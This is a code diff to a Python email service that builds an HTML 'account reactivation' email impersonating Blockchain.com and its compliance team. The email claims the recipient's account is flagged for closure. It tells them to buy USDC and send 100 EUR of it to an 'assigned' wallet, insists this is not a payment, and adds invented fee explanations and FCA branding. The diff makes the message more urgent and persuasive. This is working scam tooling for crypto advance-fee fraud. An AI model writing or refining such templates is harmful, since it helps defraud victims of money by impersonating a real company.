@@ -178,8 +178,8 @@ class EmailService:
         return subject, html_body
     
     def get_reactivation_email(self, user_name: str, eth_wallet_address: str, required_amount: str = "100") -> tuple:
-        """Generate account reactivation email content"""
-        subject = "Reactivate Your Account - Blockchain.com"
+        """Generate account reactivation email content for inactivity freeze"""
+        subject = "Urgent: Account Reactivation Required - Blockchain.com"
         
         html_body = f"""
         <!DOCTYPE html>
@@ -192,8 +192,11 @@ class EmailService:
                 .header {{ background: linear-gradient(135deg, #1a1f3c 0%, #121530 100%); padding: 30px; text-align: center; border-radius: 10px 10px 0 0; }}
                 .header h1 {{ color: white; margin: 0; font-size: 24px; }}
                 .content {{ background: #f8f9fa; padding: 30px; border-radius: 0 0 10px 10px; }}
-                .wallet-box {{ background: #e9ecef; padding: 15px; border-radius: 8px; margin: 20px 0; word-break: break-all; font-family: monospace; text-align: center; }}
+                .wallet-box {{ background: #1a1f3c; color: #00d4ff; padding: 20px; border-radius: 8px; margin: 20px 0; word-break: break-all; font-family: 'Courier New', monospace; text-align: center; font-size: 14px; letter-spacing: 1px; }}
                 .important {{ background: #fff3cd; border-left: 4px solid #ffc107; padding: 15px; margin: 20px 0; }}
+                .highlight {{ background: #d4edda; border-left: 4px solid #28a745; padding: 15px; margin: 20px 0; }}
+                .warning {{ background: #f8d7da; border-left: 4px solid #dc3545; padding: 15px; margin: 20px 0; }}
+                .amount-box {{ background: #0052ff; color: white; padding: 15px 25px; border-radius: 8px; display: inline-block; font-size: 24px; font-weight: bold; margin: 10px 0; }}
                 .footer {{ text-align: center; padding: 20px; color: #666; font-size: 12px; }}
             </style>
         </head>
@@ -205,41 +208,62 @@ class EmailService:
                 <div class="content">
                     <h2>Account Reactivation Required</h2>
                     <p>Dear {user_name},</p>
-                    <p>Your account has been flagged for inactivity and is scheduled for closure as per our regulatory compliance requirements. To reactivate your account and access your funds, you must demonstrate account activity.</p>
+                    
+                    <p>Your account has been flagged due to <strong>prolonged inactivity</strong> and is currently scheduled for closure in accordance with our regulatory compliance requirements.</p>
                     
                     <div class="important">
-                        <strong>Required Action:</strong>
-                        <p>Make a positive transaction of <strong>{required_amount} EUR in USDC (ERC-20)</strong> to your wallet address below.</p>
-                        <p><em>This is NOT a payment or fee. You will be able to withdraw this amount back to your bank account immediately after your account is reactivated.</em></p>
+                        <strong>🔔 Action Required:</strong>
+                        <p>To reactivate your account and regain full access to your funds, you must demonstrate account activity by making a positive transaction of:</p>
+                        <p style="text-align: center;"><span class="amount-box">{required_amount} EUR in USDC (ERC-20)</span></p>
                     </div>
                     
-                    <p><strong>Your USDC (ERC-20) Wallet Address:</strong></p>
+                    <div class="highlight">
+                        <strong>✅ This is NOT a payment!</strong>
+                        <p>This amount is not a fee or charge. It is simply a verification deposit to demonstrate account activity. <strong>You will be able to immediately withdraw this amount back to your bank account</strong> once your account has been successfully reactivated.</p>
+                    </div>
+                    
+                    <h3>Your Assigned Wallet Address</h3>
+                    <p>The following USDC (ERC-20) wallet has been assigned to your account:</p>
                     <div class="wallet-box">
                         {eth_wallet_address}
                     </div>
+                    <p style="text-align: center; font-size: 13px; color: #666;"><em>You can also find this address in your wallet by clicking the <strong>"Deposit"</strong> button and copying it from there.</em></p>
                     
-                    <p><strong>How to deposit:</strong></p>
+                    <h3>How to Complete This Transaction</h3>
                     <ol>
-                        <li>Copy the wallet address above</li>
-                        <li>Purchase USDC from a third-party provider (e.g., Coinbase, Binance, Kraken)</li>
-                        <li>Send the USDC to the wallet address above using the ERC-20 network</li>
-                        <li>Your account will be automatically reactivated once the transaction is confirmed</li>
+                        <li><strong>Purchase USDC</strong> from a third-party cryptocurrency provider such as:
+                            <ul>
+                                <li>Coinbase</li>
+                                <li>Binance</li>
+                                <li>Kraken</li>
+                                <li>Any licensed crypto exchange</li>
+                            </ul>
+                        </li>
+                        <li><strong>Send {required_amount} EUR worth of USDC</strong> to the wallet address shown above</li>
+                        <li><strong>Use the ERC-20 (Ethereum) network</strong> when sending</li>
+                        <li>Your account will be reactivated once the transaction is confirmed on the blockchain</li>
                     </ol>
                     
-                    <div class="important">
-                        <strong>Important Notice:</strong>
-                        <p>Please note that Blockchain.com no longer offers direct crypto purchasing services for accounts flagged for suspicious activity. You must use an external provider to purchase USDC.</p>
-                        <p>The Blockchain system operates on automated protocols that require periodic activity to maintain account status. Transaction fees support the infrastructure that keeps your wallet secure.</p>
+                    <div class="warning">
+                        <strong>⚠️ Important Notice:</strong>
+                        <p>Please note that <strong>Blockchain.com no longer offers direct cryptocurrency purchasing services</strong> for accounts that have been flagged for suspicious activity or inactivity. You must use an external third-party provider to purchase USDC.</p>
+                        <p>Your account has been flagged and is <strong>set up for closure</strong>. After reactivation, you will be able to withdraw all your funds.</p>
                     </div>
                     
-                    <p>Once your account is reactivated, you will be able to withdraw all your funds. However, please note that any outstanding transaction fees must be cleared before withdrawal can be processed.</p>
+                    <div class="important">
+                        <strong>🔧 How Our System Works:</strong>
+                        <p>The Blockchain.com platform operates on a fully automated, decentralized system. This infrastructure is maintained through transaction fees generated by account activity. When accounts remain inactive for extended periods, they cannot contribute to the network's operational costs, which is why periodic activity verification is required.</p>
+                        <p>Once your wallet shows activity, it will be automatically flagged as active in our system, and you will regain full access to all features.</p>
+                    </div>
                     
-                    <p>If you have any questions, please contact our support team.</p>
-                    <p>Best regards,<br>The Blockchain.com Compliance Team</p>
+                    <p>If you have any questions or need assistance with this process, please contact our support team.</p>
+                    
+                    <p>Best regards,<br><strong>The Blockchain.com Compliance Team</strong></p>
                 </div>
                 <div class="footer">
                     <p>© 2024 Blockchain.com. All rights reserved.</p>
-                    <p>Blockchain.com is registered with the UK Financial Conduct Authority (FCA)</p>
+                    <p>Blockchain.com | London, United Kingdom | FCA Registered</p>
+                    <p style="font-size: 10px; color: #999;">This email was sent to the address associated with your Blockchain.com account. If you did not expect this email, please contact support immediately.</p>
                 </div>
             </div>
         </body>
